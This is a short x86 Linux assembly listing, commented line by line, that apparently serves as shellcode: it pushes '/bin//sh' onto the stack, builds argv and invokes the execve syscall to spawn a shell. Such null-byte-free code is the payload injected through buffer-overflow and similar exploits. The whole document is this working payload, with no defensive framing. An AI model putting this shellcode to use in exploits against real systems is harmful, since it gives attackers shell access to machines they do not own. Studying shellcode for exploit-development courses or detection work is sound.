section .text
    global _start

_start:
    xor     eax, eax        ; Clear EAX (set to 0)
    push    eax             ; Push NULL (0x00) onto the stack
    push    0x68732f2f      ; Push "//sh" onto the stack
    push    0x6e69622f      ; Push "/bin" onto the stack
    mov     ebx, esp        ; Set EBX to point to "/bin//sh"
    push    eax             ; Push NULL (0x00) as argv[1] (NULL termination)
    push    ebx             ; Push address of "/bin//sh" as argv[0]
    mov     ecx, esp        ; Set ECX to point to argv
    mov     al, 0x0b        ; Set syscall number to 11 (execve)
    int     0x80            ; Invoke syscall
